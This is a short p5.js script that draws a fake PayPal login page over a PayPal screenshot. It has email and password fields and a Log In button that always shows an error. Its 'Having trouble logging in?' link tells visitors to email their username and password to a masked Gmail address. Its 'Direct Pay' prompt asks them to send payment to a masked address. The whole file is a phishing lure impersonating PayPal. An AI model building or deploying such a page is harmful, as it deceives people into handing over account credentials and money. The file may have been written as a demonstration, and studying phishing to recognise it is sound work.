var Paypal;

var userInput;
var passInput;
var trouble;

function preload() {
	Paypal = loadImage('images/Paypal.jpg');
}

function setup() {
	canvas = createCanvas(windowWidth, windowHeight);
	canvas.position(0, 0);
	canvas.style("z-index", "-1");
	background(Paypal);

	userInput = createInput("Email or phone number");
	userInput.position(width / 2.61, height / 3.51);
	userInput.size(width / 4.3, height / 20);
	passInput = createInput("Password");
	passInput.position(width / 2.61, height / 2.71);
	passInput.size(width / 4.3, height / 20);

	button = createButton('Log In');
	button.position(width / 2.61, height / 2.205);
	button.size(width / 4.27, height / 17);
	button.mousePressed(login);

	button = createButton('Sign Up');
	button.position(width / 2.61, height / 1.59);
	button.size(width / 4.27, height / 17);
	button.mousePressed(signup);

	trouble = createA("#", "Having trouble logging in?");
	trouble.position(width / 2.243, height / 1.8625);
	trouble.mousePressed(loginhelp);

	directpay = createA("#", "Direct Pay");
	directpay.position(width / 2.075, height / 1.25);
	directpay.mousePressed(paynow);
}

function draw() {}

function login() {
	alert("Username or password is incorrect. Please enter a valid email address, phone number or password, and try again.");
}

function signup() {
	alert("OOPS! An error has occurred. This function is unavailable at this time, please try again later.");
}

function loginhelp() {
	alert("Send an email to N**********@Gmail.com with your username and password and access will be restored shortly.");
}

function paynow() {
	if (confirm("Send payment directly to this address: 192.168.*.** and your order will be processed shortly!")) {
		txt = "You pressed OK!";
		window.location.href = "index3.html";
	} else {
		txt = "You pressed Cancel!";
	}
}
function windowResized() {
	resizeCanvas(windowWidth, windowHeight);
}
